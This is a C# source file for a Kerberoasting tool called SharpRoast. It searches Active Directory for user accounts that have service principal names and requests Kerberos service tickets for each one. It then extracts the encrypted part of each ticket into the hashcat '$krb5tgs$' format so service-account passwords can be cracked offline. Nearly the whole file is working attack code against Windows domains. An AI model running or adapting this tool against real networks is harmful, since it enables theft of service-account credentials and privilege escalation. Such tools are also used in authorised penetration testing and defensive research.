using System;
using System.Text.RegularExpressions;
using System.DirectoryServices;
using System.Security.Principal;
using System.DirectoryServices.AccountManagement;
using System.Net;

class SharpRoast
{
    static bool debug = false;

    // helper to wrap output strings
    public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
    {
        if (text == null) { throw new ArgumentNullException("singleLineString"); }

        if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

        var partCount = Math.Ceiling((double)text.Length / partLength);
        if (partCount < 2)
        {
            yield return text;
        }

        for (int i = 0; i < partCount; i++)
        {
            var index = i * partLength;
            var lengthLeft = Math.Min(partLength, text.Length - index);
            var line = text.Substring(index, lengthLeft);
            yield return line;
        }
    }

    public static void GetDomainSPNTicket(string samaccountname, string spn, string userName = "user", string distinguishedName = "")//, System.Net.NetworkCredential cred = null)
    {
        string domain = "DOMAIN";

        if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
        {
            // extract the domain name from the distinguishedname
            Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
            string domainDN = dnMatch.Groups["Domain"].ToString();
            domain = domainDN.Replace("DC=", "").Replace(',', '.');
        }

        try
        {
            if (debug) Console.WriteLine("[DEBUG] (GetDomainSPNTicket) getting SPN ticket for SPN: {0}", spn);
           System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, null, Guid.NewGuid().ToString());

            byte[] requestBytes = ticket.GetRequest();
            string ticketHexStream = BitConverter.ToString(requestBytes).Replace("-", "");

            // janky regex to try to find the part of the service ticket we want
            Match match = Regex.Match(ticketHexStream, @"a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)", RegexOptions.IgnoreCase);

            if (match.Success)
            {
                // usually 23
                byte eType = Convert.ToByte(match.Groups["EtypeLen"].ToString(), 16);

                int cipherTextLen = Convert.ToInt32(match.Groups["CipherTextLen"].ToString(), 16) - 4;
                string dataToEnd = match.Groups["DataToEnd"].ToString();
                string cipherText = dataToEnd.Substring(0, cipherTextLen * 2);

                if (match.Groups["DataToEnd"].ToString().Substring(cipherTextLen * 2, 4) != "A482")
                {
                    Console.WriteLine(" [X] Error parsing ciphertext for the SPN {0}. Use the TicketByteHexStream to extract the hash offline with Get-KerberoastHashFromAPReq.\r\n", spn);

                    bool header = false;
                    foreach (string line in Split(ticketHexStream, 80))
                    {
                        if (!header)
                        {
                            Console.WriteLine("TicketHexStream        : {0}", line);
                        }
                        else
                        {
                            Console.WriteLine("                         {0}", line);
                        }
                        header = true;
                    }
                    Console.WriteLine();
                }
                else
                {
                    // output to hashcat format
                    string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", eType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                    bool header = false;
                    foreach (string line in Split(hash, 80))
                    {
                        if (!header)
                        {
                            //Console.WriteLine("Hash                   : {0}", line);
                            DateTime dtime = DateTime.Now;
                            Console.WriteLine("{0}[{1}] Obtained service ticket and hash for SPN {2} ({3})", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), spn, samaccountname);
                        }
                        else
                        {
                            //Console.WriteLine("                         {0}", line);
                        }
                        header = true;
                    }
                    //Console.WriteLine();
                }
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            DateTime dtime = DateTime.Now;
            Console.WriteLine("{0}[{1}] Error obtaining service ticket and hash for SPN {2} ({3})", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), spn, samaccountname);
            Console.WriteLine(ex);
        }
    }

    public static void Kerberoast(string userName = "", string OUName = "", System.Net.NetworkCredential cred = null)
    {
        cred = null;
        DirectoryEntry directoryObject = null;
        DirectorySearcher userSearcher = null;
        string bindPath = "";

        try
        {
            if (cred != null)
            {
                if (!String.IsNullOrEmpty(OUName))
                {
                    string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
                    bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
                }
                else
                {
                    bindPath = String.Format("LDAP://{0}", cred.Domain);
                }
            }
            else if (!String.IsNullOrEmpty(OUName))
            {
                bindPath = OUName.Replace("ldap", "LDAP");
            }

            if (!String.IsNullOrEmpty(bindPath))
            {
                if (debug) Console.WriteLine("[DEBUG] bindPath: {0}", bindPath);
                directoryObject = new DirectoryEntry(bindPath);
            }
            else
            {
                directoryObject = new DirectoryEntry();
            }

            if (cred != null)
            {
                // if we're using alternate credentials for the connection
                string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
                directoryObject.Username = userDomain;
                directoryObject.Password = cred.Password;
                if (debug) Console.WriteLine("[DEBUG] validating alternate credentials: {0}", userDomain);

                using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
                {
                    if (!pc.ValidateCredentials(cred.UserName, cred.Password))
                    {
                        Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
                        return;
                    }
                }
            }

            userSearcher = new DirectorySearcher(directoryObject);
        }
        catch (Exception ex)
        {
            Console.WriteLine("\r\n [X] Error creating the domain searcher: {0}", ex.InnerException.Message);
            return;
        }

        // check to ensure that the bind worked correctly
        try
        {
            Guid guid = directoryObject.Guid;
        }
        catch (DirectoryServicesCOMException ex)
        {
            if (!String.IsNullOrEmpty(OUName))
            {
                Console.WriteLine("\r\n  [X] Error creating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
            }
            else
            {
                Console.WriteLine("\r\n  [X] Error creating the domain searcher: {0}", ex.Message);
            }
            return;
        }

        try
        {
            if (String.IsNullOrEmpty(userName))
            {
                userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
            }
            else
            {
                userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("\r\n  [X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
            return;
        }

        if (debug) Console.WriteLine("[DEBUG] search filter: {0}", userSearcher.Filter);

        try
        {
            SearchResultCollection users = userSearcher.FindAll();

            foreach (SearchResult user in users)
            {
                string samAccountName = user.Properties["samAccountName"][0].ToString();
                string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
                //Console.WriteLine("SamAccountName         : {0}", samAccountName);
                //Console.WriteLine("DistinguishedName      : {0}", distinguishedName);
                //Console.WriteLine("ServicePrincipalName   : {0}", servicePrincipalName);
                GetDomainSPNTicket("",servicePrincipalName, userName, distinguishedName);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("\r\n  [X] Error executing the domain searcher: {0}", ex.InnerException.Message);
            return;
        }
    }
}